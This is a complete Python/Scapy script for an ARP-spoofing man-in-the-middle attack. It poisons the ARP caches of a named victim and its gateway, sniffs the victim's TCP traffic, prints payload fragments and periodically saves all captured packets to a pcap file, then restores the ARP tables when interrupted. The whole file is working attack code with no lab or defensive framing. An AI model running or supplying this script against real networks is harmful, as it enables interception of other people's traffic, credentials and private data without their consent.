from scapy.all import *
import threading
import os
import time

victim_ip = "192.168.31.132"       # <--- CHANGE THIS
gateway_ip = "192.168.31.1"        # <--- CHANGE THIS
interface = "eth0"                # <--- CHANGE THIS

captured_packets = []
save_interval = 30  # seconds

def get_mac(ip):
    ans, _ = arping(ip, timeout=2, verbose=False)
    for s, r in ans:
        return r[Ether].src
    return None

def spoof(victim_ip, gateway_ip, victim_mac, gateway_mac):
    print("[*] Starting ARP spoofing...")
    while True:
        send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac), verbose=False)
        send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac), verbose=False)
        time.sleep(2)

def restore(victim_ip, gateway_ip, victim_mac, gateway_mac):
    print("[*] Restoring ARP tables...")
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac, hwsrc=gateway_mac), count=5, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac, hwsrc=victim_mac), count=5, verbose=False)

def packet_callback(pkt):
    if IP in pkt and TCP in pkt:
        src = pkt[IP].src
        dst = pkt[IP].dst
        sport = pkt[TCP].sport
        dport = pkt[TCP].dport
        print(f"[+] TCP | {src}:{sport} -> {dst}:{dport}")

        if pkt.haslayer(Raw):
            try:
                payload = pkt[Raw].load.decode(errors="ignore")
                print(f"    └─ Payload: {payload[:60]}...")
            except:
                pass

        captured_packets.append(pkt)

def start_sniffing():
    print("[*] Sniffing TCP packets from victim...")
    sniff(filter=f"tcp and host {victim_ip}", prn=packet_callback, iface=interface, store=False)

def auto_save_packets():
    while True:
        if captured_packets:
            wrpcap("capture.pcap", captured_packets)
            print(f"[*] Auto-saved {len(captured_packets)} packets to capture.pcap")
        time.sleep(save_interval)

if __name__ == "__main__":
    try:
        victim_mac = get_mac(victim_ip)
        gateway_mac = get_mac(gateway_ip)

        if not victim_mac or not gateway_mac:
            print("[-] Failed to get MAC addresses.")
            exit()

        # Start spoofing thread
        spoof_thread = threading.Thread(target=spoof, args=(victim_ip, gateway_ip, victim_mac, gateway_mac))
        spoof_thread.start()

        # Start auto-save thread
        save_thread = threading.Thread(target=auto_save_packets, daemon=True)
        save_thread.start()

        # Start sniffing in main thread
        start_sniffing()

    except KeyboardInterrupt:
        print("[*] Keyboard interrupt received. Restoring network...")
        restore(victim_ip, gateway_ip, victim_mac, gateway_mac)
        wrpcap("capture.pcap", captured_packets)
        print("[*] Final capture.pcap saved. Exiting cleanly.")
